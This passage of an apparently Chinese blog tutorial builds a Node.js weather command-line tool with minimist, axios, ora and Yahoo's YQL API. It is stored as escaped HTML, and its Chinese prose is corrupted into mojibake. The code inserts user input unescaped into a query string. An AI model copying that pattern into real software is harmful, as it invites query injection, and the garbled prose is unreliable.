&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç°åœ¨å¦‚æœè¿è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today&lt;/code&gt; åˆ™ä¼šè¾“å‡º â€œtoday is sunnyâ€ï¼Œè‹¥è¿è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;weather hello&lt;/code&gt; åˆ™ä¼šè¾“å‡ºé”™è¯¯çš„ä¿¡æ¯ â€œhello is not a valid command!â€ï¼Œ&lt;/p&gt;

&lt;h3 id=&quot;43-é¢„æœŸä¸å®¹é”™&quot;&gt;4.3 é¢„æœŸä¸å®¹é”™&lt;/h3&gt;

&lt;p&gt;é™¤äº†ç¨‹åºç”¨å‘½ä»¤ï¼Œè¿˜éœ€è¦é¢å¤–å¤„ç†å¦‚ &lt;code class=&quot;highlighter-rouge&quot;&gt;version&lt;/code&gt; å’Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; æ­¤ç±»çš„å‘½ä»¤ï¼Œå½“ç”¨æˆ·è¾“å…¥é”™è¯¯çš„å‚æ•°åº”è¯¥ä¼šå¾—åˆ°æ­£ç¡®çš„åé¦ˆä¿¡æ¯ï¼Œä»¥æç¤ºç”¨æˆ·æ­£ç¡®çš„è¿›è¡Œå‚æ•°çš„è¾“å…¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[index.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'minimist'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;minimist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// å–ç¬¬ä¸€ä¸ªå‚æ•°å‘½ä»¤ï¼Œè‹¥æ²¡æœ‰è·å–åˆ°åˆ™é»˜è®¤ä½¿ç”¨ help å‘½ä»¤&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;help&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/today'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'./cmds/help'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nl&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; is not a valid command!`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[cmds/version]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../package.json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[cmds/help]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;menus&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`
        weather [command] &amp;lt;options&amp;gt;

        today   ........... show weather for today
        version ........... show program version
        help    ........... show help menu for a command
    `&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

    &lt;span class=&quot;na&quot;&gt;today&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`
        weather today &amp;lt;options&amp;gt;

        --location, -l .... the location to use
    `&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;subCmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;menus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;menus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ­¤æ—¶å¦‚æœè¿è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;weather help today&lt;/code&gt; æˆ–è€… &lt;code class=&quot;highlighter-rouge&quot;&gt;weather today -h&lt;/code&gt;ï¼Œå°†ä¼šçœ‹è§ &lt;strong&gt;today&lt;/strong&gt; å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ã€‚è¿è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;weather&lt;/code&gt; æˆ–è€… &lt;code class=&quot;highlighter-rouge&quot;&gt;weather -h&lt;/code&gt; å°†ä¼šè¾“å‡ºä¸»èœå•å¸®åŠ©ä¿¡æ¯ã€‚&lt;/p&gt;

&lt;h3 id=&quot;44-è¿›åº¦ä¸è¯·æ±‚&quot;&gt;4.4 è¿›åº¦ä¸è¯·æ±‚&lt;/h3&gt;

&lt;p&gt;æŸäº›å‘½ä»¤å¯èƒ½ä¼šæ‰§è¡Œå¾ˆé•¿æ—¶é—´ï¼Œä¸ºäº†è®©ç”¨æˆ·å¾—åˆ°æ­£åœ¨è¿è¡Œçš„åé¦ˆçŠ¶æ€ï¼Œåº”è¯¥åœ¨æ‰§è¡Œæ—¶æ˜¾ç¤º &lt;strong&gt;è¿›åº¦&lt;/strong&gt;ï¼Œä½¿ç”¨å‘½ä»¤ &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --save axios ora&lt;/code&gt; å®‰è£…ç¬¬ä¸‰æ–¹çš„è¿›åº¦ä¸ç½‘ç»œè¯·æ±‚çš„åº“ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;è¿›åº¦ ora çš„æ›´å¤šç”¨æ³•è¯·å‚çœ‹ &lt;a href=&quot;https://www.npmjs.com/package/ora&quot;&gt;https://www.npmjs.com/package/ora&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;è¯·æ±‚ axios çš„æ›´å¤šç”¨æ³•è¯·å‚çœ‹ &lt;a href=&quot;https://www.npmjs.com/package/axios&quot;&gt;https://www.npmjs.com/package/axios&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç°åœ¨æˆ‘ä»¬å¼€å§‹è¯·æ±‚å¤©æ°”ï¼Œä½¿ç”¨çš„æ˜¯ &lt;strong&gt;é›…è™&lt;/strong&gt; çš„ APIï¼Œæ­¤ API ä½¿ç”¨çš„ &lt;strong&gt;â€œYQLâ€&lt;/strong&gt; çš„è¯­æ³•æŸ¥è¯¢ï¼Œå…³é”®çš„æ˜¯å®ƒä¸éœ€è¦ &lt;strong&gt;API Key&lt;/strong&gt; å°±å¯ä»¥ç›´æ¥è¿›è¡Œæ¥å£çš„è°ƒç”¨ï¼Œéå¸¸æ–¹ä¾¿ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[utils/yahoo.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;axios&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'axios'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;axios&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://query.yahooapis.com/v1/public/yql'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`select item from weather.forecast where woeid in
            (select woeid from geo.places(1) where text=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[cmds/today.js]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ora&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ora'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getWeather&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../utils/yahoo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// å¼€å¯è¿›åº¦&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;spinner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ora&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;weather&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getWeather&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// å…³é—­è¿›åº¦&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;spinner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`Current conditions in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`\t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;weather&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Â° &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;weather&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
